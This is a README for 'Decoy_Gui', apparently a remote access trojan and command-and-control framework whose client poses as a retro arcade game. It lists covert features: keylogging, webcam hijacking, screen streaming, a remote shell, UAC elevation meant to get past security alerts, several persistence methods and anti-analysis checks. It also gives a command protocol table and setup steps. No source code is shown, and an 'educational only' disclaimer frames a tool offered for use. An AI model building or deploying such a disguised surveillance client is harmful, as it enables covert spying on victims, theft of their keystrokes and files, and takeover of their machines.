# Decoy_Gui: Advanced Multi-Tiered C2 Framework

**Decoy_Gui** is a state-of-the-art Remote Administration Tool (RAT) and Command & Control (C2) system designed for educational security research and penetration testing. It features a three-component architecture: a stealthy client with a built-in game decoy, a robust command server, and a high-fidelity modern dashboard.

---

## 🎯 Project Overview

The project is designed to demonstrate how advanced malware can evade detection using "Game Decoy" techniques while maintaining persistent, high-speed control over a target system.

### 🏛️ Component Architecture
1.  **Direct Client (`d.py`)**: A Python-based agent that runs as a "Retro Arcade Hub" to the observer, but operates as a powerful surveillance and control agent in the background.
2.  **C2 Server (`s.py`)**: A multi-threaded Python server that manages client connections, handles cryptographic handshakes, and manages a task queue via an SQLite database.
3.  **Command Dashboard (GUI)**: A sleek, modern Next.js/React application providing real-time data visualization, live streaming, and command history.

---

## 🚀 Key Features

### 1. 🕹️ Game Decoy System
The client presents a fully functional Retro Arcade (Snake, Pong) created with Pygame. This provides a legitimate reason for the process to be running and consuming resources.

### 2. 🕵️ Stealth & Persistence
-   **Shadow Process**: The RAT can spawn "shadow" clones that run entirely in the background with hidden windows.
-   **UAC Elevation**: Built-in mechanisms to request administrative privileges and bypass standard security alerts.
-   **Persistence Engines**: Installs itself via Registry Run keys, Scheduled Tasks, and Startup folders to survive reboots.
-   **Anti-Analysis**: Detects virtual machines and debuggers.

### 3. 📹 Real-Time Surveillance
-   **Screen Streaming**: Live 720p 20FPS screen streaming to the GUI.
-   **Webcam Hijacking**: Remote camera access for live monitoring.
-   **Advanced Keylogger**: Captures all keystrokes in the background and syncs them to the server.

### 4. 🛠️ System Control & Tools
-   **Remote Shell**: Interactive terminal access to the target OS.
-   **File Browser**: Full exploration of the target filesystem (Drives, Folders, Files).
-   **Network Mapper**: Scans local networks and maps active devices.
-   **Resource Monitoring**: Real-time tracking of CPU, RAM, and Network usage (Last 10 frames displayed).

---

## 📖 Command Usage

The system uses a JSON-based command protocol. Commands can be sent via the Server CLI or the Dashboard.

| Command | Description | Example Params |
| :--- | :--- | :--- |
| `shell` | Run a system command | `{"cmd": "whoami"}` |
| `elevate` | Request UAC Elevation | `N/A` |
| `screen_stream` | Start/Stop Screen Stream | `{"action": "start", "fps": 20}` |
| `webcam_stream` | Start/Stop Webcam Capture | `{"action": "start"}` |
| `persistence` | Install persistence | `N/A` |
| `file_browser` | List directory contents | `{"path": "C:\\Users"}` |
| `upload` / `download` | Transfer files between C2/Target | `{"remote_path": "file.txt"}` |
| `network_scan` | Scan local network | `{"subnet": "192.168.1.0/24"}` |

---

## 🛠️ Setup & Installation

### 1. Client (`d.py`)
Install dependencies:
```bash
pip install pygame opencv-python psutil requests cryptography pillow
```
Run the client:
```bash
python d.py --host 127.0.0.1 --port 4444
```

### 2. Server (`s.py`)
Run the server:
```bash
python s.py
```
*The server will create `c2_server.db` automatically.*

### 3. Dashboard (GUI)
Install Node dependencies:
```bash
npm install
```
Launch the Dev Server:
```bash
npm run dev
```
Open `http://localhost:3000` to start monitoring.

---

## 🔐 Cryptography & Security
All communication between `d.py` and `s.py` is encrypted using **AES-256 (CBC mode)** with a shared master key. The handshake involves:
1.  Dynamic session key exchange.
2.  HMAC verification for message integrity.
3.  Command ID tracking to prevent replay attacks.

---

## ⚠️ Disclaimer
This software is for **RESEARCH AND EDUCATIONAL PURPOSES ONLY**. The author assumes no liability for misuse or illegal use of this code. Unauthorized access to computer systems is illegal.

---
© 2026 Decoy_Gui Project | Advanced Agentic Coding Group
